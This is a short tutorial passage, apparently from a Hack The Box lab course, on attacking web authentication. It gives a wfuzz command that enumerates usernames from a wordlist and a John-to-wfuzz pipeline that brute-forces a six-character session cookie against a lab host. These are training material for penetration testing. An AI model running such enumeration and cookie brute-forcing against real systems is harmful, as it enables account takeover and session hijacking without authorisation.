Web Fuzzer

Example command to fuzz for usernames in a web application: 
```shell
wfuzz -c -z file,/opt/useful/SecLists/Usernames/top-usernames-shortlist.txt -d "Username=FUZZ&Password=dummypass" --hs "Unknown username" http://brokenauthentication.hackthebox.eu/user_unknown.php
```

[Wfuzz](https://github.com/xmendez/wfuzz/) can be fed by another program using a classic pipe, and we will use `John` as a feeder. We set `John` in incremental mode, using the built-in "LowerNum" charset that matches our observation (`--incremental=LowerNum`), we specify a password length of 6 chars (`--min-length=6 --max-length=6`), and we also instruct `John` to print the output as stdout (`--stdout`). Then, `wfuzz` uses the payload from stdin (`-z stdin`) and fuzzes the "HTBSESS" cookie (`-b HTBSESS=FUZZ`), looking for the string `"Welcome"` (`--ss "Welcome"`) in server responses for the given URL.

```shell
john --incremental=LowerNum --min-length=6 --max-length=6 --stdout | wfuzz -z stdin -b HTBSESS=FUZZ --ss "Welcome" -u https://brokenauthentication.hackthebox.eu/profile.php
```